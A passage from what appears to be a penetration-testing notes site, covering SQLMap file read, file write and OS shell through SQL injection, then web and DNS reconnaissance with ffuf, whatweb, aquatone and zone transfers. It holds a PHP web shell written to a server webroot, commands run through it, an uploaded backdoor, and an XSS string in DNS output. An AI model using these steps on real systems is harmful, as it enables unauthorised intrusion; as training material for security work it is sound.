__H__\n ___ ___[)]_____ ___ ___  {1.4.11#stable}\n|_ -| . [)]     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 17:40:00 /2020-11-19/\n\n[17:40:00] [INFO] resuming back-end DBMS 'mysql'\n[17:40:00] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n...SNIP...\n[17:40:01] [INFO] fetching file: '/etc/passwd'\n[17:40:01] [WARNING] time-based comparison requires larger statistical model, please wait............................. (done)\n[17:40:07] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'\n[17:40:07] [WARNING] unable to retrieve the content of the file '/etc/passwd', going to fall-back to simpler UNION technique\n[17:40:07] [INFO] fetching file: '/etc/passwd'\ndo you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] y\n\n[17:40:14] [INFO] the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B)\nfiles saved to [1]:\n[*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)\n\n[*] ending @ 17:40:14 /2020-11-19/\n</code></pre> <pre><code>secops@kali[/kali]$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n...SNIP...\n</code></pre>  Writing Local Files <p>For example, in MySql, the <code>--secure-file-priv</code> configuration must be manually disabled to allow writing data into local files using the <code>INTO OUTFILE</code> SQL query, in addition to any local access needed on the host server, like the privilege to write in the directory we need.</p> <p>Still, many web applications require the ability for DBMSes to write data into files, so it is worth testing whether we can write files to the remote server. To do that with SQLMap, we can use the <code>--file-write</code> and <code>--file-dest</code> options.</p> <pre><code>secops@kali[/kali]$ echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php\n</code></pre> <p>Let's attempt to write this file on the remote server, in the <code>/var/www/html/</code> directory, the default server webroot for Apache. If we didn't know the server webroot, we will see how SQLMap can automatically find it.</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1\" --file-write \"shell.php\" --file-dest \"/var/www/html/shell.php\"\n\n        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.4.11#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 17:54:18 /2020-11-19/\n\n[17:54:19] [INFO] resuming back-end DBMS 'mysql'\n[17:54:19] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n...SNIP...\ndo you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] y\n\n[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)\n\n[*] ending @ 17:54:28 /2020-11-19/\n</code></pre> <p>SQL Map confirmed the file was written:</p> <pre><code>[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)\n</code></pre> <p>Now, we can attempt to access the remote PHP shell, and execute a sample command:</p> <pre><code>secops@kali[/kali]$ curl http://www.example.com/shell.php?cmd=ls+-la\n\ntotal 148\ndrwxrwxrwt 1 www-data www-data   4096 Nov 19 17:54 .\ndrwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..\n-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php\n...SNIP...\n</code></pre>  OS Command Execution <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1\" --os-shell\n\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  {1.4.11#stable}\n|_ -| . [)]     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[*] starting @ 18:02:15 /2020-11-19/\n\n[18:02:16] [INFO] resuming back-end DBMS 'mysql'\n[18:02:16] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n...SNIP...\n[18:02:37] [INFO] the local file '/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so' and the remote file './libslpjs.so' have the same size (8040 B)\n[18:02:37] [INFO] creating UDF 'sys_exec' from the binary UDF file\n[18:02:38] [INFO] creating UDF 'sys_eval' from the binary UDF file\n[18:02:39] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution\n[18:02:39] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER\n\nos-shell&gt; ls -la\ndo you want to retrieve the command standard output? [Y/n/a] a\n\n[18:02:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique\nNo output\n</code></pre> <p>We see that SQLMap defaulted to <code>UNION</code> technique to get an OS shell, but eventually failed to give us any output <code>No output</code>. Let's try to specify another technique that has a better chance of giving us direct output, like the <code>Error-based SQL Injection</code>, which we can specify with <code>--technique=E</code>:</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1\" --os-shell --technique=E\n\n        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.4.11#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 18:05:59 /2020-11-19/\n\n[18:05:59] [INFO] resuming back-end DBMS 'mysql'\n[18:05:59] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n...SNIP...\nwhich web application language does the web server support?\n[1] ASP\n[2] ASPX\n[3] JSP\n[4] PHP (default)\n&gt; 4\n\ndo you want sqlmap to further try to provoke the full path disclosure? [Y/n] y\n\n[18:06:07] [WARNING] unable to automatically retrieve the web server document root\nwhat do you want to use for writable directory?\n[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)\n[2] custom location(s)\n[3] custom directory list file\n[4] brute force search\n&gt; 1\n\n[18:06:09] [WARNING] unable to automatically parse any web server path\n[18:06:09] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method\n[18:06:09] [WARNING] potential permission problems detected ('Permission denied')\n[18:06:10] [WARNING] unable to upload the file stager on '/var/www/'\n[18:06:10] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method\n[18:06:11] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpumgzr.php\n[18:06:11] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpbznbe.php\n[18:06:11] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER\n\nos-shell&gt; ls -la\n\ndo you want to retrieve the command standard output? [Y/n/a] a\n\ncommand standard output:\n---\ntotal 156\ndrwxrwxrwt 1 www-data www-data   4096 Nov 19 18:06 .\ndrwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..\n-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php\n...SNIP...\n</code></pre>  <p>Note: SQLMap first asked us for the type of language used on this remote server, which we know is PHP. Then it asked us for the server web root directory, and we asked SQLMap to automatically find it using 'common location(s)'. Both of these options are the default options, and would have been automatically chosen if we added the '--batch' option to SQLMap.</p>","title":"OS Exploitation"},{"location":"web/info_gathering/active_info_gathering/active_infrastructure_identification/","text":"Web Servers <p>Web Servers</p> <p>The first thing we can do to identify the webserver version is to look at the response headers.</p> <pre><code>secops@kali[/kali]$ curl -I \"http://${TARGET}\"\n\nHTTP/1.1 200 OK\nDate: Thu, 23 Sep 2021 15:10:42 GMT\nServer: Apache/2.4.25 (Debian)\nX-Powered-By: PHP/7.3.5\nLink: &lt;http://192.168.10.10/wp-json/&gt;; rel=\"https://api.w.org/\"\nContent-Type: text/html; charset=UTF-8\n</code></pre> <p>WafW00f is a web application firewall (<code>WAF</code>) fingerprinting tool that sends requests and analyses responses to determine if a security solution is in place.</p> <pre><code>secops@kali[/kali]$ sudo apt install wafw00f -y\n</code></pre> <p>We can use options like <code>-a</code> to check all possible WAFs in place instead of stopping scanning at the first match, read targets from an input file via the <code>-i</code> flag, or proxy the requests using the <code>-p</code> option.</p> <pre><code>secops@kali[/kali]$ wafw00f -v https://www.tesla.com\n\n                   ______\n                  /      \\\n                 (  Woof! )\n                  \\  ____/                      )\n                  ,,                           ) (_\n             .-. -    _______                 ( |__|\n            ()``; |==|_______)                .)|__|\n            / ('        /|\\                  (  |__|\n        (  /  )        / | \\                  . |__|\n         \\(_)_))      /  |  \\                   |__|\n\n                    ~ WAFW00F : v2.1.0 ~\n    The Web Application Firewall Fingerprinting Toolkit\n\n[*] Checking https://www.tesla.com\n[+] The site https://www.tesla.com is behind CacheWall (Varnish) WAF.\n[~] Number of requests: 2\n</code></pre> <p>Aquatone is a tool for automatic and visual inspection of websites across many hosts and is convenient for quickly gaining an overview of HTTP-based attack surfaces by scanning a list of configurable ports, visiting the website with a headless Chrome browser, and taking and screenshot. This is helpful, especially when dealing with huge subdomain lists.</p> <pre><code>secops@kali[/kali]$ sudo apt install golang chromium-driver\nsecops@kali[/kali]$ go get github.com/michenriksen/aquatone\nsecops@kali[/kali]$ export PATH=\"$PATH\":\"$HOME/go/bin\"\n</code></pre> <p>Use <code>cat</code> in our subdomain list and pipe the command to <code>aquatone</code> via:</p> <pre><code>secops@kali[/kali]$ cat facebook_aquatone.txt | aquatone -out ./aquatone -screenshot-timeout 1000\n\naquatone v1.7.0 started at 2021-10-06T10:14:42+01:00\n\nTargets    : 30\nThreads    : 2\nPorts      : 80, 443, 8000, 8080, 8443\nOutput dir : aquatone\n\nedge-star-shv-01-cdg2.facebook.com: port 80 open\nedge-extern-shv-01-waw1.facebook.com: port 80 open\nwhatsapp-chatd-edge-shv-01-ams4.facebook.com: port 80 open\nedge-secure-shv-01-ham3.facebook.com: port 80 open\nsv-se.facebook.com: port 80 open\nko.facebook.com: port 80 open\nhttps://edge-secure-shv-01-ham3.facebook.com/: screenshot timed out\nhttps://sv-se.facebook.com/: screenshot timed out\nhttps://ko.facebook.com/: screenshot timed out\nhttps://synthetic-e2e-elbprod-sli-shv-01-otp1.facebook.com/: screenshot successful\nCalculating page structures... done\nClustering similar pages... done\nGenerating HTML report... done\n\nWriting session file...Time:\n - Started at  : 2021-10-06T10:14:42+01:00\n - Finished at : 2021-10-06T10:15:01+01:00\n - Duration    : 19s\n\nRequests:\n - Successful : 12\n - Failed     : 5\n\n - 2xx : 10\n - 3xx : 0\n - 4xx : 2\n - 5xx : 0\n\nScreenshots:\n - Successful : 2\n - Failed     : 10\n\nWrote HTML report to: aquatone/aquatone_report.html\n</code></pre> <p>When it finishes, we will have a file called <code>aquatone_report.html</code> where we can see screenshots, technologies identified, server response headers, and HTML.</p>  Whatweb <p>Whatweb recognizes web technologies, including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices. In this case, we will use an aggression level of 3 via the <code>-a</code> flag and verbose output via <code>-v</code>.</p> <pre><code>secops@kali[/kali]$ whatweb -a3 https://www.facebook.com -v\n\nWhatWeb report for https://www.facebook.com\nStatus    : 200 OK\nTitle     : &lt;None&gt;\nIP        : 31.13.92.36\nCountry   : IRELAND, IE\n\nSummary   : Strict-Transport-Security[max-age=15552000; preload], PasswordField[pass], Script[text/javascript], X-XSS-Protection[0], HTML5, X-Frame-Options[DENY], Meta-Refresh-Redirect[/?_fb_noscript=1], UncommonHeaders[x-fb-rlafr,x-content-type-options,x-fb-debug,alt-svc]\n\nDetected Plugins:\n[ HTML5 ]\n    HTML version 5, detected by the doctype declaration\n\n\n[ Meta-Refresh-Redirect ]\n    Meta refresh tag is a deprecated URL element that can be\n    used to optionally wait x seconds before reloading the\n    current page or loading a new page. More info:\n    https://secure.wikimedia.org/wikipedia/en/wiki/Meta_refresh\n\n    String       : /?_fb_noscript=1\n\n[ PasswordField ]\n    find password fields\n\n    String       : pass (from field name)\n\n[ Script ]\n    This plugin detects instances of script HTML elements and\n    returns the script language/type.\n\n    String       : text/javascript\n\n&lt;SNIP&gt;\n\n[ X-Frame-Options ]\n    This plugin retrieves the X-Frame-Options value from the\n    HTTP header. - More Info:\n    http://msdn.microsoft.com/en-us/library/cc288472%28VS.85%29.\n    aspx\n\n    String       : DENY\n\n[ X-XSS-Protection ]\n    This plugin retrieves the X-XSS-Protection value from the\n    HTTP header. - More Info:\n    http://msdn.microsoft.com/en-us/library/cc288472%28VS.85%29.\n    aspx\n\n    String       : 0\n&lt;SNIP&gt;\n</code></pre>","title":"Infrastructure Identification"},{"location":"web/info_gathering/active_info_gathering/active_subdomain_enumeration/","text":"ZoneTransfers <p>The zone transfer is how a secondary DNS server receives information from the primary DNS server and updates it. The master-slave approach is used to organize DNS servers within a domain, with the slaves receiving updated DNS information from the master DNS. The master DNS server should be configured to enable zone transfers from secondary (slave) DNS servers, although this might be misconfigured.</p> <p></p> Manual approach <p>Identifying Nameservers <pre><code>secops@kali[/kali]$ nslookup -type=NS zonetransfer.me\n\nServer:     10.100.0.1\nAddress:    10.100.0.1#53\n\nNon-authoritative answer:\nzonetransfer.me nameserver = nsztm2.digi.ninja.\nzonetransfer.me nameserver = nsztm1.digi.ninja.\n</code></pre></p> <p>Testing for ANY and AXFR Zone Transfer <pre><code>secops@kali[/kali]$ nslookup -type=any -query=AXFR zonetransfer.me nsztm1.digi.ninja\n\nServer:     nsztm1.digi.ninja\nAddress:    81.4.108.41#53\n\nzonetransfer.me\n    origin = nsztm1.digi.ninja\n    mail addr = robin.digi.ninja\n    serial = 2019100801\n    refresh = 172800\n    retry = 900\n    expire = 1209600\n    minimum = 3600\nzonetransfer.me hinfo = \"Casio fx-700G\" \"Windows XP\"\nzonetransfer.me text = \"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA\"\nzonetransfer.me mail exchanger = 0 ASPMX.L.GOOGLE.COM.\nzonetransfer.me mail exchanger = 10 ALT1.ASPMX.L.GOOGLE.COM.\nzonetransfer.me mail exchanger = 10 ALT2.ASPMX.L.GOOGLE.COM.\nzonetransfer.me mail exchanger = 20 ASPMX2.GOOGLEMAIL.COM.\nzonetransfer.me mail exchanger = 20 ASPMX3.GOOGLEMAIL.COM.\nzonetransfer.me mail exchanger = 20 ASPMX4.GOOGLEMAIL.COM.\nzonetransfer.me mail exchanger = 20 ASPMX5.GOOGLEMAIL.COM.\n&lt;SNIP&gt;\nName:   alltcpportsopen.firewall.test.zonetransfer.me\nAddress: 127.0.0.1\ntesting.zonetransfer.me canonical name = www.zonetransfer.me.\nName:   vpn.zonetransfer.me\nAddress: 174.36.59.154\nName:   www.zonetransfer.me\nAddress: 5.196.105.14\nxss.zonetransfer.me text = \"'&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;\"\nzonetransfer.me\n    origin = nsztm1.digi.ninja\n    mail addr = robin.digi.ninja\n    serial = 2019100801\n    refresh = 172800\n    retry = 900\n    expire = 1209600\n    minimum = 3600\n</code></pre></p>","title":"Subdomain Enumeration"},{"location":"web/info_gathering/active_info_gathering/crawling/","text":"","title":"Crawling"},{"location":"web/info_gathering/active_info_gathering/crawling/#ffuf","text":"<p>Discover files and folders that we cannot spot by simply browsing the website. Launch <code>ffuf</code> with a list of folders names and instruct it to look recursively through them.</p> <pre><code>secops@kali[/kali]$ ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.1.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://192.168.10.10/FUZZ\n :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nwp-admin                [Status: 301, Size: 317, Words: 20, Lines: 10]\n[INFO] Adding a new job to the queue: http://192.168.10.10/wp-admin/FUZZ\n\nwp-includes             [Status: 301, Size: 320, Words: 20, Lines: 10]\n[INFO] Adding a new job to the queue: http://192.168.10.10/wp-includes/FUZZ\n\nwp-content              [Status: 301, Size: 319, Words: 20, Lines: 10]\n[INFO] Adding a new job to the queue: http://192.168.10.10/wp-content/FUZZ\n\nadmin                   [Status: 302, Size: 0, Words: 1, Lines: 1]\nlogin                   [Status: 302, Size: 0, Words: 1, Lines: 1]\nfeed                    [Status: 301, Size: 0, Words: 1, Lines: 1]\n[INFO] Adding a new job to the queue: http://192.168.10.10/feed/FUZZ\n...\n</code></pre> <ul> <li> <code>-recursion</code>: Activates the recursive scan.</li> <li> <code>-recursion-depth</code>: Specifies the maximum depth to scan.</li> <li> <code>-u</code>: Our target URL, and <code>FUZZ</code> will be the injection point.</li> <li> <code>-w</code>: Path to our wordlist.</li> </ul>","title":"FFUF"},{"location":"web/info_gathering/active_info_gathering/crawling/#sensitive-information-disclosure","text":"<p>It is common to find backup or unreferenced files that can have important information or credentials. There are some lists of common extensions we can find in the <code>raft-[ small | medium | large ]-extensions.txt</code> files from SecLists.</p> <p>We will combine some of the folders we have found before, a list of common extensions, and some words extracted from the website to see if we can find something that should not be there. The first step will be to create a file with the following folder names and save it as <code>folders.txt</code>.</p> <pre><code>wp-admin\nwp-content\nwp-includes\n</code></pre> <p>Next, we will extract some keywords from the website using CeWL. We will instruct the tool to extract words with a minimum length of 5 characters <code>-m5</code>, convert them to lowercase <code>--lowercase</code> and save them into a file called wordlist.txt <code>-w &lt;FILE&gt;</code>:</p> <pre><code>secops@kali[/kali]$ cewl -m5 --lowercase -w wordlist.txt http://192.168.10.10\n</code></pre> <p>The next step will be to combine everything in ffuf to see if we can find some information. Use the following parameters in <code>ffuf</code>:</p> <ul> <li> <code>-w</code>: We separate the wordlists by coma and add an alias to them to inject them as fuzzing points later</li> <li> <code>-u</code>: Our target URL with the fuzzing points.</li> </ul> <pre><code>secops@kali[/kali]$ ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://192.168.10.10/FOLDERS/WORDLISTEXTENSIONS\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.1.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://192.168.10.10/FOLDERS/WORDLISTEXTENSIONS\n :: Wordlist         : FOLDERS: ./folders.txt\n :: Wordlist         : WORDLIST: ./wordlist.txt\n :: Wordlist         : EXTENSIONS: ./extensions.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\n[Status: 200, Size: 8, Words: 1, Lines: 2]\n    * EXTENSIONS: ~\n    * FOLDERS: wp-content\n    * WORDLIST: secret\n\n[Status: 200, Size: 0, Words: 1, Lines: 1]\n    * FOLDERS: wp-includes\n    * WORDLIST: comment\n    * EXTENSIONS: .php\n\n[Status: 302, Size: 0, Words: 1, Lines: 1]\n    * FOLDERS: wp-admin\n    * WORDLIST: comment\n    * EXTENSIONS: .php\n\n...\n</code></pre> <pre><code>secops@kali[/kali]$ curl http://192.168.10.10/wp-content/secret~\n</code></pre> <p>Following this approach, we have successfully found a secret file.</p>","title":"Sensitive Information Disclosure"},{"location":"web/info_gathering/active_info_gathering/virtual_hosts/","text":"<p><code>vHost</code> is a feature that allows several websites to be hosted on a single server.</p> Automating Virtual Hosts Discovery <pre><code>MATCHER OPTIONS:\n  -mc                 Match HTTP status codes, or \"all\" for everything. (default: 200,204,301,302,307,401,403,405)\n  -ml                 Match amount of lines in response\n  -mr                 Match regexp\n  -ms                 Match HTTP response size\n  -mw                 Match amount of words in response\n\nFILTER OPTIONS:\n  -fc                 Filter HTTP status codes from response. Comma separated list of codes and ranges\n  -fl                 Filter by amount of lines in response. Comma separated list of line counts and ranges\n  -fr                 Filter regexp\n  -fs                 Filter HTTP response size. Comma separated list of sizes and ranges\n  -fw                 Filter by amount of words in response. Comma separated list of word counts and ranges\n</code></pre> <pre><code>secops@kali[/kali]$ ffuf -w ./vhosts -u http://192.168.10.10 -H \"HOST: FUZZ.randomtarget.com\" -fs 612\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.1.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://192.168.10.10\n :: Wordlist         : FUZZ: ./vhosts\n :: Header           : Host: FUZZ.randomtarget.com\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response size: 612\n________________________________________________\n\ndev-admin               [Status: 200, Size: 120, Words: 7, Lines: 12]\nwww                     [Status: 200, Size: 185, Words: 41, Lines: 9]\nsome                    [Status: 200, Size: 195, Words: 41, Lines: 9]\n:: Progress: [12/12] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::\n</code></pre> <ul> <li> <code>-w</code>: Path to our wordlist</li> <li> <code>-u</code>: URL we want to fuzz</li> <li> <code>-H \"HOST: FUZZ.randomtarget.com\"</code>: This is the <code>HOST</code> Header, and the word <code>FUZZ</code> will be used as the fuzzing point.</li> <li> <code>-fs 612</code>: Filter responses with a size of 612, default response size in this case.</li> </ul>","title":"Virtual Hosts"},{"location":"web/info_gathering/passive_info_gathering/dns/","text":"<pre><code>secops@kali[/kali]$ export TARGET=\"facebook.com\"\nsecops@kali[/kali]$ nslookup $TARGET\n\nServer:     1.1.1.1\nAddress:    1.1.1.1#53\n\nNon-authoritative answer:\nName:   facebook.com\nAddress: 31.13.92.36\nName:   facebook.com\nAddress: 2a03:2880:f11c:8083:face:b00c:0:25de\n</code></pre> <p>We can also specify a nameserver if needed by adding <code>@&lt;nameserver/IP&gt;</code> to the command. Unlike nslookup, <code>DIG</code> shows us some more information that can be of importance.</p> <pre><code>secops@kali[/kali]$ dig facebook.com @1.1.1.1\n\n; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; facebook.com @1.1.1.1\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 58899\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;facebook.com.                  IN      A\n\n;; ANSWER SECTION:\nfacebook.com.           169     IN      A       31.13.92.36\n\n;; Query time: 20 msec\n;; SERVER: 1.1.1.1#53(1.1.1.1)\n;; WHEN: Mo Okt 18 16:03:17 CEST 2021\n;; MSG SIZE  rcvd: 57\n</code></pre> <p>Querying: A Records for a Subdomain</p> <pre><code>secops@kali[/kali]$ export TARGET=www.facebook.com\nsecops@kali[/kali]$ nslookup -query=A $TARGET\n\nServer:     1.1.1.1\nAddress:    1.1.1.1#53\n\nNon-authoritative answer:\nwww.facebook.com    canonical name = star-mini.c10r.facebook.com.\nName:   star-mini.c10r.facebook.com\nAddress: 31.13.92.36\n</code></pre> <pre><code>secops@kali[/kali]$ dig a www.facebook.com @1.1.1.1\n\n; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; a www.facebook.com @1.1.1.1\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 15596\n;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;www.facebook.com.              IN      A\n\n;; ANSWER SECTION:\nwww.facebook.com.       3585    IN      CNAME   star-mini.c10r.facebook.com.\nstar-mini.c10r.facebook.com. 45 IN      A       31.13.92.36\n\n;; Query time: 16 msec\n;; SERVER: 1.1.1.1#53(1.1.1.1)\n;; WHEN: Mo Okt 18 16:11:48 CEST 2021\n;; MSG SIZE  rcvd: 90\n</code></pre> <p>Querying: PTR Records for an IP Address <pre><code>secops@kali[/kali]$ nslookup -query=PTR 31.13.92.36\n\nServer:     1.1.1.1\nAddress:    1.1.1.1#53\n\nNon-authoritative answer:\n36.92.13.31.in-addr.arpa    name = edge-star-mini-shv-01-frt3.facebook.com.\n\nAuthoritative answers can be found from:\n</code></pre></p> <pre><code>secops@kali[/kali]$ dig -x 31.13.92.36 @1.1.1.1\n\n; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; -x 31.13.92.36 @1.1.1.1\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 51730\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;36.92.13.31.in-addr.arpa.      IN      PTR\n\n;; ANSWER SECTION:\n36.92.13.31.in-addr.arpa. 1028  IN      PTR     edge-star-mini-shv-01-frt3.facebook.com.\n\n;; Query time: 16 msec\n;; SERVER: 1.1.1.1#53(1.1.1.1)\n;; WHEN: Mo Okt 18 16:14:20 CEST 2021\n;; MSG SIZE  rcvd: 106\n</code></pre> <p>Querying: ANY Existing Records <pre><code>secops@kali[/kali]$ export TARGET=\"google.com\"\nsecops@kali[/kali]$ nslookup -query=ANY $TARGET\n\nServer:     10.100.0.1\nAddress:    10.100.0.1#53\n\nNon-authoritative answer:\nName:   google.com\nAddress: 172.217.16.142\nName:   google.com\nAddress: 2a00:1450:4001:808::200e\ngoogle.com  text = \"docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e\"\ngoogle.com  text = \"docusign=1b0a6754-49b1-4db5-8540-d2c12664b289\"\ngoogle.com  text = \"v=spf1 include:_spf.google.com ~all\"\ngoogle.com  text = \"MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB\"\ngoogle.com  text = \"globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=\"\ngoogle.com  text = \"apple-domain-verification=30afIBcvSuDV2PLX\"\ngoogle.com  text = \"google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o\"\ngoogle.com  text = \"facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95\"\ngoogle.com  text = \"google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ\"\ngoogle.com  nameserver = ns3.google.com.\ngoogle.com  nameserver = ns2.google.com.\ngoogle.com  nameserver = ns1.google.com.\ngoogle.com  nameserver = ns4.google.com.\ngoogle.com  mail exchanger = 10 aspmx.l.google.com.\ngoogle.com  mail exchanger = 40 alt3.aspmx.l.google.com.\ngoogle.com  mail exchanger = 20 alt1.aspmx.l.google.com.\ngoogle.com  mail exchanger = 30 alt2.aspmx.l.google.com.\ngoogle.com  mail exchanger = 50 alt4.aspmx.l.google.com.\ngoogle.com\n    origin = ns1.google.com\n    mail addr = dns-admin.google.com\n    serial = 398195569\n    refresh = 900\n    retry = 900\n    expire = 1800\n    minimum = 60\ngoogle.com  rdata_257 = 0 issue \"pki.goog\"\n\nAuthoritative answers can be found from:\n</code></pre></p> <pre><code>secops@kali[/kali]$ dig any google.com @8.8.8.8\n\n; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; any google.com @8.8.8.8\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 49154\n;; flags: qr rd ra; QUERY: 1, ANSWER: 22, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 512\n;; QUESTION SECTION:\n;google.com.                    IN      ANY\n\n;; ANSWER SECTION:\ngoogle.com.             249     IN      A       142.250.184.206\ngoogle.com.             249     IN      AAAA    2a00:1450:4001:830::200e\ngoogle.com.             549     IN      MX      10 aspmx.l.google.com.\ngoogle.com.             3549    IN      TXT     \"apple-domain-verification=30afIBcvSuDV2PLX\"\ngoogle.com.             3549    IN      